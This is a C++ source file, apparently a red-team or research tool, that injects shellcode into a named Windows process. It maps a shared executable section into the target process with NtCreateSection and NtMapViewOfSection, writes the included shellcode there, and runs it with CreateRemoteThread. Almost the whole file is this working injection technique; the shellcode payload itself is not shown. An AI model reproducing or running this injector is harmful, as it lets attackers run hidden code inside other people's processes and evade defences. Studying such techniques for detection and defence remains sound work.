/**
* Injects shellcode into a process using a shared section.
* Supports 32- and 64 Bit applications.
* [Warning] - The current implementation crashes the target process after executing the shellcode
*/

#include <Windows.h>
#include <string>
#include <cstdio>
#include <tlhelp32.h>

#include "../payload/shellcode.hpp"
#include "../common/ntddk.h"


int main(int argc, char* argv[])
{
	const char* processName;

	if (argc != 2)
	{
		printf("Usage: *.exe processName\n");
		return 1;
	}

	processName = argv[1];

	printf("[Info] - Injecting shellcode into %s\n", processName);

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	if (processesSnapshot == INVALID_HANDLE_VALUE)
	{
		printf("[Error] %d - Failed to CreateToolhelp32Snapshot\n", GetLastError());
		return 1;
	}

	// get first process of snapshot
	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
	if (!Process32First(processesSnapshot, &processEntry))
	{
		printf("[Error] %d - Failed to Process32First\n", GetLastError());
		return 1;
	}

	bool foundTargetProcess = false;

	// iterate processes
	do
	{
		// check if we found the target process
		if (strcmpi(processEntry.szExeFile, processName) == 0)
		{
			foundTargetProcess = true;
			break;
		}
	} while (Process32Next(processesSnapshot, &processEntry));

	if (!foundTargetProcess)
	{
		printf("[Error] - Failed to find process: %s\n", processName);
		return 1;
	}

	printf("[Info] - Found Process %s with pid %d\n", processName, processEntry.th32ProcessID);

	// acquire a handle to the target process
	HANDLE targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
	if (!targetProcessHandle)
	{
		printf("[Error] %d - Failed to acquire process handle\n", GetLastError());
		return 1;
	}

	printf("[Info] - Acquired process handle %p\n", targetProcessHandle);

	HANDLE section;
	SIZE_T size = 0x1000;
	LARGE_INTEGER sectionSize = { size };
	void* localSectionOffset = nullptr;
	void* remoteSectionOffset = nullptr;

	// create the section to be shared between this and the target process
	if (!NT_SUCCESS(NtCreateSection(&section, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)))
	{
		printf("[Error] - Failed to create section\n");
		return 1;
	}

	// map into own process
	if (!NT_SUCCESS(NtMapViewOfSection(section, GetCurrentProcess(), &localSectionOffset, NULL, NULL, NULL, &size, ViewUnmap, NULL, PAGE_READWRITE)))
	{
		printf("[Error] - Failed to map view of section into own section\n");
		return 1;
	}

	// map into target process
	if (!NT_SUCCESS(NtMapViewOfSection(section, targetProcessHandle, &remoteSectionOffset, NULL, NULL, NULL, &size, ViewUnmap, NULL, PAGE_EXECUTE_READ)))
	{
		printf("[Error] - Failed to mao view of section into target process\n");
		return 1;
	}

	// copy shellcode into section. This change will be reflected in the target process
	memcpy(localSectionOffset, shellcode, sizeof(shellcode));

	// create a thread in the target process which loads the .dll
	HANDLE hThread = CreateRemoteThread(
		targetProcessHandle,
		nullptr,
		NULL,
		reinterpret_cast<LPTHREAD_START_ROUTINE>(remoteSectionOffset),
		NULL,
		NULL,
		nullptr
	);

	if (!hThread)
	{
		printf("[Error %d] - Failed to CreateRemoteThread\n", GetLastError());
		return 1;
	}

	printf("[Info] - Created remote thread. Executing %p\n", remoteSectionOffset);

	CloseHandle(hThread);
}